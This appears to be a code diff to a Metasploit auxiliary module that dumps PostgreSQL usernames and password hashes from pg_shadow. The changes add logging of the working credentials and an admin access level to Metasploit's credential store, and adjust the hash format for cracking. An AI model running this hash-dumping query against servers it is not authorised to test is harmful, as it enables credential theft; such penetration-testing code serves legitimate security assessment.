@@ -35,12 +35,40 @@ class Metasploit3 < Msf::Auxiliary
     #Query the Postgres Shadow table for username and password hashes and report them
     res = postgres_query('SELECT usename, passwd FROM pg_shadow',false)
 
+    service_data = {
+        address: ip,
+        port: rport,
+        service_name: 'postgres',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+        module_fullname: self.fullname,
+        origin_type: :service,
+        private_data: datastore['PASSWORD'],
+        private_type: :password,
+        username: datastore['USERNAME']
+    }
+
+    credential_data.merge!(service_data)
+
     #Error handling routine here, borrowed heavily from todb
     case res.keys[0]
     when :conn_error
       print_error("A Connection Error occured")
       return
     when :sql_error
+      # We know the credentials worked but something else went wrong
+      credential_core = create_credential(credential_data)
+      login_data = {
+          core: credential_core,
+          last_attempted_at: DateTime.now,
+          status: Metasploit::Credential::Login::Status::SUCCESSFUL
+      }
+      login_data.merge!(service_data)
+      create_credential_login(login_data)
+
       case res[:sql_error]
       when /^C42501/
         print_error "#{datastore['RHOST']}:#{datastore['RPORT']} Postgres - Insufficient permissions."
@@ -50,6 +78,16 @@ class Metasploit3 < Msf::Auxiliary
         return
       end
     when :complete
+      credential_core = create_credential(credential_data)
+      login_data = {
+          core: credential_core,
+          last_attempted_at: DateTime.now,
+          status: Metasploit::Credential::Login::Status::SUCCESSFUL
+      }
+      login_data.merge!(service_data)
+      # We know the credentials worked and have admin access because we got the hashes
+      login_data[:access_level] = 'Admin'
+      create_credential_login(login_data)
       print_status("Query appears to have run successfully")
     end
 
@@ -70,7 +108,7 @@ class Metasploit3 < Msf::Auxiliary
 
     credential_data = {
         origin_type: :service,
-        jtr_format: 'raw-md5',
+        jtr_format: 'raw-md5,postgres',
         module_fullname: self.fullname,
         private_type: :nonreplayable_hash
     }
